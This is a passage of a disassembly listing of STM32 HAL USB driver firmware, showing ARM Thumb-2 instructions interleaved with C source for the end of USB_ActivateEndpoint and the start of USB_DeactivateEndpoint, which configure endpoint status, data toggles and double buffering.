 80060ec:	66bb      	str	r3, [r7, #104]	; 0x68
 80060ee:	683b      	ldr	r3, [r7, #0]
 80060f0:	691b      	ldr	r3, [r3, #16]
 80060f2:	f003 0301 	and.w	r3, r3, #1
 80060f6:	2b00      	cmp	r3, #0
 80060f8:	d002      	beq.n	8006100 <USB_ActivateEndpoint+0x2e8>
 80060fa:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 80060fc:	3301      	adds	r3, #1
 80060fe:	66bb      	str	r3, [r7, #104]	; 0x68
 8006100:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006102:	881b      	ldrh	r3, [r3, #0]
 8006104:	b29a      	uxth	r2, r3
 8006106:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 8006108:	b29b      	uxth	r3, r3
 800610a:	029b      	lsls	r3, r3, #10
 800610c:	b29b      	uxth	r3, r3
 800610e:	4313      	orrs	r3, r2
 8006110:	b29a      	uxth	r2, r3
 8006112:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006114:	801a      	strh	r2, [r3, #0]
      PCD_CLEAR_RX_DTOG(USBx, ep->num);
 8006116:	687a      	ldr	r2, [r7, #4]
 8006118:	683b      	ldr	r3, [r7, #0]
 800611a:	781b      	ldrb	r3, [r3, #0]
 800611c:	009b      	lsls	r3, r3, #2
 800611e:	4413      	add	r3, r2
 8006120:	881b      	ldrh	r3, [r3, #0]
 8006122:	847b      	strh	r3, [r7, #34]	; 0x22
 8006124:	8c7b      	ldrh	r3, [r7, #34]	; 0x22
 8006126:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 800612a:	2b00      	cmp	r3, #0
 800612c:	d01b      	beq.n	8006166 <USB_ActivateEndpoint+0x34e>
 800612e:	687a      	ldr	r2, [r7, #4]
 8006130:	683b      	ldr	r3, [r7, #0]
 8006132:	781b      	ldrb	r3, [r3, #0]
 8006134:	009b      	lsls	r3, r3, #2
 8006136:	4413      	add	r3, r2
 8006138:	881b      	ldrh	r3, [r3, #0]
 800613a:	b29b      	uxth	r3, r3
 800613c:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006140:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006144:	843b      	strh	r3, [r7, #32]
 8006146:	687a      	ldr	r2, [r7, #4]
 8006148:	683b      	ldr	r3, [r7, #0]
 800614a:	781b      	ldrb	r3, [r3, #0]
 800614c:	009b      	lsls	r3, r3, #2
 800614e:	441a      	add	r2, r3
 8006150:	8c3b      	ldrh	r3, [r7, #32]
 8006152:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006156:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800615a:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 800615e:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006162:	b29b      	uxth	r3, r3
 8006164:	8013      	strh	r3, [r2, #0]

      if (ep->num == 0U)
 8006166:	683b      	ldr	r3, [r7, #0]
 8006168:	781b      	ldrb	r3, [r3, #0]
 800616a:	2b00      	cmp	r3, #0
 800616c:	d124      	bne.n	80061b8 <USB_ActivateEndpoint+0x3a0>
      {
        /* Configure VALID status for EP0 */
        PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_VALID);
 800616e:	687a      	ldr	r2, [r7, #4]
 8006170:	683b      	ldr	r3, [r7, #0]
 8006172:	781b      	ldrb	r3, [r3, #0]
 8006174:	009b      	lsls	r3, r3, #2
 8006176:	4413      	add	r3, r2
 8006178:	881b      	ldrh	r3, [r3, #0]
 800617a:	b29b      	uxth	r3, r3
 800617c:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 8006180:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006184:	83bb      	strh	r3, [r7, #28]
 8006186:	8bbb      	ldrh	r3, [r7, #28]
 8006188:	f483 5380 	eor.w	r3, r3, #4096	; 0x1000
 800618c:	83bb      	strh	r3, [r7, #28]
 800618e:	8bbb      	ldrh	r3, [r7, #28]
 8006190:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 8006194:	83bb      	strh	r3, [r7, #28]
 8006196:	687a      	ldr	r2, [r7, #4]
 8006198:	683b      	ldr	r3, [r7, #0]
 800619a:	781b      	ldrb	r3, [r3, #0]
 800619c:	009b      	lsls	r3, r3, #2
 800619e:	441a      	add	r2, r3
 80061a0:	8bbb      	ldrh	r3, [r7, #28]
 80061a2:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80061a6:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80061aa:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80061ae:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80061b2:	b29b      	uxth	r3, r3
 80061b4:	8013      	strh	r3, [r2, #0]
 80061b6:	e1ea      	b.n	800658e <USB_ActivateEndpoint+0x776>
      }
      else
      {
        /* Configure NAK status for OUT Endpoint */
        PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_NAK);
 80061b8:	687a      	ldr	r2, [r7, #4]
 80061ba:	683b      	ldr	r3, [r7, #0]
 80061bc:	781b      	ldrb	r3, [r3, #0]
 80061be:	009b      	lsls	r3, r3, #2
 80061c0:	4413      	add	r3, r2
 80061c2:	881b      	ldrh	r3, [r3, #0]
 80061c4:	b29b      	uxth	r3, r3
 80061c6:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 80061ca:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80061ce:	83fb      	strh	r3, [r7, #30]
 80061d0:	8bfb      	ldrh	r3, [r7, #30]
 80061d2:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 80061d6:	83fb      	strh	r3, [r7, #30]
 80061d8:	687a      	ldr	r2, [r7, #4]
 80061da:	683b      	ldr	r3, [r7, #0]
 80061dc:	781b      	ldrb	r3, [r3, #0]
 80061de:	009b      	lsls	r3, r3, #2
 80061e0:	441a      	add	r2, r3
 80061e2:	8bfb      	ldrh	r3, [r7, #30]
 80061e4:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80061e8:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80061ec:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80061f0:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80061f4:	b29b      	uxth	r3, r3
 80061f6:	8013      	strh	r3, [r2, #0]
 80061f8:	e1c9      	b.n	800658e <USB_ActivateEndpoint+0x776>
  }
#if (USE_USB_DOUBLE_BUFFER == 1U)
  /* Double Buffer */
  else
  {
    if (ep->type == EP_TYPE_BULK)
 80061fa:	683b      	ldr	r3, [r7, #0]
 80061fc:	78db      	ldrb	r3, [r3, #3]
 80061fe:	2b02      	cmp	r3, #2
 8006200:	d11e      	bne.n	8006240 <USB_ActivateEndpoint+0x428>
    {
      /* Set bulk endpoint as double buffered */
      PCD_SET_BULK_EP_DBUF(USBx, ep->num);
 8006202:	687a      	ldr	r2, [r7, #4]
 8006204:	683b      	ldr	r3, [r7, #0]
 8006206:	781b      	ldrb	r3, [r3, #0]
 8006208:	009b      	lsls	r3, r3, #2
 800620a:	4413      	add	r3, r2
 800620c:	881b      	ldrh	r3, [r3, #0]
 800620e:	b29b      	uxth	r3, r3
 8006210:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006214:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006218:	f8a7 3062 	strh.w	r3, [r7, #98]	; 0x62
 800621c:	687a      	ldr	r2, [r7, #4]
 800621e:	683b      	ldr	r3, [r7, #0]
 8006220:	781b      	ldrb	r3, [r3, #0]
 8006222:	009b      	lsls	r3, r3, #2
 8006224:	441a      	add	r2, r3
 8006226:	f8b7 3062 	ldrh.w	r3, [r7, #98]	; 0x62
 800622a:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800622e:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006232:	f443 4301 	orr.w	r3, r3, #33024	; 0x8100
 8006236:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800623a:	b29b      	uxth	r3, r3
 800623c:	8013      	strh	r3, [r2, #0]
 800623e:	e01d      	b.n	800627c <USB_ActivateEndpoint+0x464>
    }
    else
    {
      /* Set the ISOC endpoint in double buffer mode */
      PCD_CLEAR_EP_KIND(USBx, ep->num);
 8006240:	687a      	ldr	r2, [r7, #4]
 8006242:	683b      	ldr	r3, [r7, #0]
 8006244:	781b      	ldrb	r3, [r3, #0]
 8006246:	009b      	lsls	r3, r3, #2
 8006248:	4413      	add	r3, r2
 800624a:	881b      	ldrh	r3, [r3, #0]
 800624c:	b29b      	uxth	r3, r3
 800624e:	f423 43e2 	bic.w	r3, r3, #28928	; 0x7100
 8006252:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006256:	f8a7 3064 	strh.w	r3, [r7, #100]	; 0x64
 800625a:	687a      	ldr	r2, [r7, #4]
 800625c:	683b      	ldr	r3, [r7, #0]
 800625e:	781b      	ldrb	r3, [r3, #0]
 8006260:	009b      	lsls	r3, r3, #2
 8006262:	441a      	add	r2, r3
 8006264:	f8b7 3064 	ldrh.w	r3, [r7, #100]	; 0x64
 8006268:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800626c:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006270:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006274:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006278:	b29b      	uxth	r3, r3
 800627a:	8013      	strh	r3, [r2, #0]
    }

    /* Set buffer address for double buffered mode */
    PCD_SET_EP_DBUF_ADDR(USBx, ep->num, ep->pmaaddr0, ep->pmaaddr1);
 800627c:	687b      	ldr	r3, [r7, #4]
 800627e:	65fb      	str	r3, [r7, #92]	; 0x5c
 8006280:	687b      	ldr	r3, [r7, #4]
 8006282:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8006286:	b29b      	uxth	r3, r3
 8006288:	461a      	mov	r2, r3
 800628a:	6dfb      	ldr	r3, [r7, #92]	; 0x5c
 800628c:	4413      	add	r3, r2
 800628e:	65fb      	str	r3, [r7, #92]	; 0x5c
 8006290:	683b      	ldr	r3, [r7, #0]
 8006292:	781b      	ldrb	r3, [r3, #0]
 8006294:	00da      	lsls	r2, r3, #3
 8006296:	6dfb      	ldr	r3, [r7, #92]	; 0x5c
 8006298:	4413      	add	r3, r2
 800629a:	f503 6380 	add.w	r3, r3, #1024	; 0x400
 800629e:	65bb      	str	r3, [r7, #88]	; 0x58
 80062a0:	683b      	ldr	r3, [r7, #0]
 80062a2:	891b      	ldrh	r3, [r3, #8]
 80062a4:	085b      	lsrs	r3, r3, #1
 80062a6:	b29b      	uxth	r3, r3
 80062a8:	005b      	lsls	r3, r3, #1
 80062aa:	b29a      	uxth	r2, r3
 80062ac:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 80062ae:	801a      	strh	r2, [r3, #0]
 80062b0:	687b      	ldr	r3, [r7, #4]
 80062b2:	657b      	str	r3, [r7, #84]	; 0x54
 80062b4:	687b      	ldr	r3, [r7, #4]
 80062b6:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80062ba:	b29b      	uxth	r3, r3
 80062bc:	461a      	mov	r2, r3
 80062be:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80062c0:	4413      	add	r3, r2
 80062c2:	657b      	str	r3, [r7, #84]	; 0x54
 80062c4:	683b      	ldr	r3, [r7, #0]
 80062c6:	781b      	ldrb	r3, [r3, #0]
 80062c8:	00da      	lsls	r2, r3, #3
 80062ca:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80062cc:	4413      	add	r3, r2
 80062ce:	f203 4304 	addw	r3, r3, #1028	; 0x404
 80062d2:	653b      	str	r3, [r7, #80]	; 0x50
 80062d4:	683b      	ldr	r3, [r7, #0]
 80062d6:	895b      	ldrh	r3, [r3, #10]
 80062d8:	085b      	lsrs	r3, r3, #1
 80062da:	b29b      	uxth	r3, r3
 80062dc:	005b      	lsls	r3, r3, #1
 80062de:	b29a      	uxth	r2, r3
 80062e0:	6d3b      	ldr	r3, [r7, #80]	; 0x50
 80062e2:	801a      	strh	r2, [r3, #0]

    if (ep->is_in == 0U)
 80062e4:	683b      	ldr	r3, [r7, #0]
 80062e6:	785b      	ldrb	r3, [r3, #1]
 80062e8:	2b00      	cmp	r3, #0
 80062ea:	f040 8093 	bne.w	8006414 <USB_ActivateEndpoint+0x5fc>
    {
      /* Clear the data toggle bits for the endpoint IN/OUT */
      PCD_CLEAR_RX_DTOG(USBx, ep->num);
 80062ee:	687a      	ldr	r2, [r7, #4]
 80062f0:	683b      	ldr	r3, [r7, #0]
 80062f2:	781b      	ldrb	r3, [r3, #0]
 80062f4:	009b      	lsls	r3, r3, #2
 80062f6:	4413      	add	r3, r2
 80062f8:	881b      	ldrh	r3, [r3, #0]
 80062fa:	f8a7 3040 	strh.w	r3, [r7, #64]	; 0x40
 80062fe:	f8b7 3040 	ldrh.w	r3, [r7, #64]	; 0x40
 8006302:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8006306:	2b00      	cmp	r3, #0
 8006308:	d01b      	beq.n	8006342 <USB_ActivateEndpoint+0x52a>
 800630a:	687a      	ldr	r2, [r7, #4]
 800630c:	683b      	ldr	r3, [r7, #0]
 800630e:	781b      	ldrb	r3, [r3, #0]
 8006310:	009b      	lsls	r3, r3, #2
 8006312:	4413      	add	r3, r2
 8006314:	881b      	ldrh	r3, [r3, #0]
 8006316:	b29b      	uxth	r3, r3
 8006318:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800631c:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006320:	87fb      	strh	r3, [r7, #62]	; 0x3e
 8006322:	687a      	ldr	r2, [r7, #4]
 8006324:	683b      	ldr	r3, [r7, #0]
 8006326:	781b      	ldrb	r3, [r3, #0]
 8006328:	009b      	lsls	r3, r3, #2
 800632a:	441a      	add	r2, r3
 800632c:	8ffb      	ldrh	r3, [r7, #62]	; 0x3e
 800632e:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006332:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006336:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 800633a:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800633e:	b29b      	uxth	r3, r3
 8006340:	8013      	strh	r3, [r2, #0]
      PCD_CLEAR_TX_DTOG(USBx, ep->num);
 8006342:	687a      	ldr	r2, [r7, #4]
 8006344:	683b      	ldr	r3, [r7, #0]
 8006346:	781b      	ldrb	r3, [r3, #0]
 8006348:	009b      	lsls	r3, r3, #2
 800634a:	4413      	add	r3, r2
 800634c:	881b      	ldrh	r3, [r3, #0]
 800634e:	87bb      	strh	r3, [r7, #60]	; 0x3c
 8006350:	8fbb      	ldrh	r3, [r7, #60]	; 0x3c
 8006352:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8006356:	2b00      	cmp	r3, #0
 8006358:	d01b      	beq.n	8006392 <USB_ActivateEndpoint+0x57a>
 800635a:	687a      	ldr	r2, [r7, #4]
 800635c:	683b      	ldr	r3, [r7, #0]
 800635e:	781b      	ldrb	r3, [r3, #0]
 8006360:	009b      	lsls	r3, r3, #2
 8006362:	4413      	add	r3, r2
 8006364:	881b      	ldrh	r3, [r3, #0]
 8006366:	b29b      	uxth	r3, r3
 8006368:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800636c:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006370:	877b      	strh	r3, [r7, #58]	; 0x3a
 8006372:	687a      	ldr	r2, [r7, #4]
 8006374:	683b      	ldr	r3, [r7, #0]
 8006376:	781b      	ldrb	r3, [r3, #0]
 8006378:	009b      	lsls	r3, r3, #2
 800637a:	441a      	add	r2, r3
 800637c:	8f7b      	ldrh	r3, [r7, #58]	; 0x3a
 800637e:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006382:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006386:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 800638a:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 800638e:	b29b      	uxth	r3, r3
 8006390:	8013      	strh	r3, [r2, #0]

      PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_VALID);
 8006392:	687a      	ldr	r2, [r7, #4]
 8006394:	683b      	ldr	r3, [r7, #0]
 8006396:	781b      	ldrb	r3, [r3, #0]
 8006398:	009b      	lsls	r3, r3, #2
 800639a:	4413      	add	r3, r2
 800639c:	881b      	ldrh	r3, [r3, #0]
 800639e:	b29b      	uxth	r3, r3
 80063a0:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 80063a4:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80063a8:	873b      	strh	r3, [r7, #56]	; 0x38
 80063aa:	8f3b      	ldrh	r3, [r7, #56]	; 0x38
 80063ac:	f483 5380 	eor.w	r3, r3, #4096	; 0x1000
 80063b0:	873b      	strh	r3, [r7, #56]	; 0x38
 80063b2:	8f3b      	ldrh	r3, [r7, #56]	; 0x38
 80063b4:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 80063b8:	873b      	strh	r3, [r7, #56]	; 0x38
 80063ba:	687a      	ldr	r2, [r7, #4]
 80063bc:	683b      	ldr	r3, [r7, #0]
 80063be:	781b      	ldrb	r3, [r3, #0]
 80063c0:	009b      	lsls	r3, r3, #2
 80063c2:	441a      	add	r2, r3
 80063c4:	8f3b      	ldrh	r3, [r7, #56]	; 0x38
 80063c6:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80063ca:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80063ce:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80063d2:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80063d6:	b29b      	uxth	r3, r3
 80063d8:	8013      	strh	r3, [r2, #0]
      PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_DIS);
 80063da:	687a      	ldr	r2, [r7, #4]
 80063dc:	683b      	ldr	r3, [r7, #0]
 80063de:	781b      	ldrb	r3, [r3, #0]
 80063e0:	009b      	lsls	r3, r3, #2
 80063e2:	4413      	add	r3, r2
 80063e4:	881b      	ldrh	r3, [r3, #0]
 80063e6:	b29b      	uxth	r3, r3
 80063e8:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80063ec:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 80063f0:	86fb      	strh	r3, [r7, #54]	; 0x36
 80063f2:	687a      	ldr	r2, [r7, #4]
 80063f4:	683b      	ldr	r3, [r7, #0]
 80063f6:	781b      	ldrb	r3, [r3, #0]
 80063f8:	009b      	lsls	r3, r3, #2
 80063fa:	441a      	add	r2, r3
 80063fc:	8efb      	ldrh	r3, [r7, #54]	; 0x36
 80063fe:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006402:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006406:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 800640a:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800640e:	b29b      	uxth	r3, r3
 8006410:	8013      	strh	r3, [r2, #0]
 8006412:	e0bc      	b.n	800658e <USB_ActivateEndpoint+0x776>
    }
    else
    {
      /* Clear the data toggle bits for the endpoint IN/OUT */
      PCD_CLEAR_RX_DTOG(USBx, ep->num);
 8006414:	687a      	ldr	r2, [r7, #4]
 8006416:	683b      	ldr	r3, [r7, #0]
 8006418:	781b      	ldrb	r3, [r3, #0]
 800641a:	009b      	lsls	r3, r3, #2
 800641c:	4413      	add	r3, r2
 800641e:	881b      	ldrh	r3, [r3, #0]
 8006420:	f8a7 304e 	strh.w	r3, [r7, #78]	; 0x4e
 8006424:	f8b7 304e 	ldrh.w	r3, [r7, #78]	; 0x4e
 8006428:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 800642c:	2b00      	cmp	r3, #0
 800642e:	d01d      	beq.n	800646c <USB_ActivateEndpoint+0x654>
 8006430:	687a      	ldr	r2, [r7, #4]
 8006432:	683b      	ldr	r3, [r7, #0]
 8006434:	781b      	ldrb	r3, [r3, #0]
 8006436:	009b      	lsls	r3, r3, #2
 8006438:	4413      	add	r3, r2
 800643a:	881b      	ldrh	r3, [r3, #0]
 800643c:	b29b      	uxth	r3, r3
 800643e:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006442:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006446:	f8a7 304c 	strh.w	r3, [r7, #76]	; 0x4c
 800644a:	687a      	ldr	r2, [r7, #4]
 800644c:	683b      	ldr	r3, [r7, #0]
 800644e:	781b      	ldrb	r3, [r3, #0]
 8006450:	009b      	lsls	r3, r3, #2
 8006452:	441a      	add	r2, r3
 8006454:	f8b7 304c 	ldrh.w	r3, [r7, #76]	; 0x4c
 8006458:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800645c:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006460:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 8006464:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006468:	b29b      	uxth	r3, r3
 800646a:	8013      	strh	r3, [r2, #0]
      PCD_CLEAR_TX_DTOG(USBx, ep->num);
 800646c:	687a      	ldr	r2, [r7, #4]
 800646e:	683b      	ldr	r3, [r7, #0]
 8006470:	781b      	ldrb	r3, [r3, #0]
 8006472:	009b      	lsls	r3, r3, #2
 8006474:	4413      	add	r3, r2
 8006476:	881b      	ldrh	r3, [r3, #0]
 8006478:	f8a7 304a 	strh.w	r3, [r7, #74]	; 0x4a
 800647c:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 8006480:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8006484:	2b00      	cmp	r3, #0
 8006486:	d01d      	beq.n	80064c4 <USB_ActivateEndpoint+0x6ac>
 8006488:	687a      	ldr	r2, [r7, #4]
 800648a:	683b      	ldr	r3, [r7, #0]
 800648c:	781b      	ldrb	r3, [r3, #0]
 800648e:	009b      	lsls	r3, r3, #2
 8006490:	4413      	add	r3, r2
 8006492:	881b      	ldrh	r3, [r3, #0]
 8006494:	b29b      	uxth	r3, r3
 8006496:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800649a:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800649e:	f8a7 3048 	strh.w	r3, [r7, #72]	; 0x48
 80064a2:	687a      	ldr	r2, [r7, #4]
 80064a4:	683b      	ldr	r3, [r7, #0]
 80064a6:	781b      	ldrb	r3, [r3, #0]
 80064a8:	009b      	lsls	r3, r3, #2
 80064aa:	441a      	add	r2, r3
 80064ac:	f8b7 3048 	ldrh.w	r3, [r7, #72]	; 0x48
 80064b0:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80064b4:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80064b8:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80064bc:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 80064c0:	b29b      	uxth	r3, r3
 80064c2:	8013      	strh	r3, [r2, #0]

      if (ep->type != EP_TYPE_ISOC)
 80064c4:	683b      	ldr	r3, [r7, #0]
 80064c6:	78db      	ldrb	r3, [r3, #3]
 80064c8:	2b01      	cmp	r3, #1
 80064ca:	d024      	beq.n	8006516 <USB_ActivateEndpoint+0x6fe>
      {
        /* Configure NAK status for the Endpoint */
        PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_NAK);
 80064cc:	687a      	ldr	r2, [r7, #4]
 80064ce:	683b      	ldr	r3, [r7, #0]
 80064d0:	781b      	ldrb	r3, [r3, #0]
 80064d2:	009b      	lsls	r3, r3, #2
 80064d4:	4413      	add	r3, r2
 80064d6:	881b      	ldrh	r3, [r3, #0]
 80064d8:	b29b      	uxth	r3, r3
 80064da:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80064de:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 80064e2:	f8a7 3044 	strh.w	r3, [r7, #68]	; 0x44
 80064e6:	f8b7 3044 	ldrh.w	r3, [r7, #68]	; 0x44
 80064ea:	f083 0320 	eor.w	r3, r3, #32
 80064ee:	f8a7 3044 	strh.w	r3, [r7, #68]	; 0x44
 80064f2:	687a      	ldr	r2, [r7, #4]
 80064f4:	683b      	ldr	r3, [r7, #0]
 80064f6:	781b      	ldrb	r3, [r3, #0]
 80064f8:	009b      	lsls	r3, r3, #2
 80064fa:	441a      	add	r2, r3
 80064fc:	f8b7 3044 	ldrh.w	r3, [r7, #68]	; 0x44
 8006500:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006504:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006508:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 800650c:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006510:	b29b      	uxth	r3, r3
 8006512:	8013      	strh	r3, [r2, #0]
 8006514:	e01d      	b.n	8006552 <USB_ActivateEndpoint+0x73a>
      }
      else
      {
        /* Configure TX Endpoint to disabled state */
        PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_DIS);
 8006516:	687a      	ldr	r2, [r7, #4]
 8006518:	683b      	ldr	r3, [r7, #0]
 800651a:	781b      	ldrb	r3, [r3, #0]
 800651c:	009b      	lsls	r3, r3, #2
 800651e:	4413      	add	r3, r2
 8006520:	881b      	ldrh	r3, [r3, #0]
 8006522:	b29b      	uxth	r3, r3
 8006524:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006528:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 800652c:	f8a7 3046 	strh.w	r3, [r7, #70]	; 0x46
 8006530:	687a      	ldr	r2, [r7, #4]
 8006532:	683b      	ldr	r3, [r7, #0]
 8006534:	781b      	ldrb	r3, [r3, #0]
 8006536:	009b      	lsls	r3, r3, #2
 8006538:	441a      	add	r2, r3
 800653a:	f8b7 3046 	ldrh.w	r3, [r7, #70]	; 0x46
 800653e:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006542:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006546:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 800654a:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800654e:	b29b      	uxth	r3, r3
 8006550:	8013      	strh	r3, [r2, #0]
      }

      PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_DIS);
 8006552:	687a      	ldr	r2, [r7, #4]
 8006554:	683b      	ldr	r3, [r7, #0]
 8006556:	781b      	ldrb	r3, [r3, #0]
 8006558:	009b      	lsls	r3, r3, #2
 800655a:	4413      	add	r3, r2
 800655c:	881b      	ldrh	r3, [r3, #0]
 800655e:	b29b      	uxth	r3, r3
 8006560:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 8006564:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006568:	f8a7 3042 	strh.w	r3, [r7, #66]	; 0x42
 800656c:	687a      	ldr	r2, [r7, #4]
 800656e:	683b      	ldr	r3, [r7, #0]
 8006570:	781b      	ldrb	r3, [r3, #0]
 8006572:	009b      	lsls	r3, r3, #2
 8006574:	441a      	add	r2, r3
 8006576:	f8b7 3042 	ldrh.w	r3, [r7, #66]	; 0x42
 800657a:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 800657e:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006582:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006586:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800658a:	b29b      	uxth	r3, r3
 800658c:	8013      	strh	r3, [r2, #0]
    }
  }
#endif /* (USE_USB_DOUBLE_BUFFER == 1U) */

  return ret;
 800658e:	f897 306f 	ldrb.w	r3, [r7, #111]	; 0x6f
}
 8006592:	4618      	mov	r0, r3
 8006594:	3774      	adds	r7, #116	; 0x74
 8006596:	46bd      	mov	sp, r7
 8006598:	f85d 7b04 	ldr.w	r7, [sp], #4
 800659c:	4770      	bx	lr
 800659e:	bf00      	nop

080065a0 <USB_DeactivateEndpoint>:
  * @param  USBx Selected device
  * @param  ep pointer to endpoint structure
  * @retval HAL status
  */
HAL_StatusTypeDef USB_DeactivateEndpoint(USB_TypeDef *USBx, USB_EPTypeDef *ep)
{
 80065a0:	b480      	push	{r7}
 80065a2:	b08d      	sub	sp, #52	; 0x34
 80065a4:	af00      	add	r7, sp, #0
 80065a6:	6078      	str	r0, [r7, #4]
 80065a8:	6039      	str	r1, [r7, #0]
  if (ep->doublebuffer == 0U)
 80065aa:	683b      	ldr	r3, [r7, #0]
 80065ac:	7b1b      	ldrb	r3, [r3, #12]
 80065ae:	2b00      	cmp	r3, #0
 80065b0:	f040 808e 	bne.w	80066d0 <USB_DeactivateEndpoint+0x130>
  {
    if (ep->is_in != 0U)
 80065b4:	683b      	ldr	r3, [r7, #0]
 80065b6:	785b      	ldrb	r3, [r3, #1]
 80065b8:	2b00      	cmp	r3, #0
 80065ba:	d044      	beq.n	8006646 <USB_DeactivateEndpoint+0xa6>
    {
      PCD_CLEAR_TX_DTOG(USBx, ep->num);
 80065bc:	687a      	ldr	r2, [r7, #4]
 80065be:	683b      	ldr	r3, [r7, #0]
 80065c0:	781b      	ldrb	r3, [r3, #0]
 80065c2:	009b      	lsls	r3, r3, #2
 80065c4:	4413      	add	r3, r2
 80065c6:	881b      	ldrh	r3, [r3, #0]
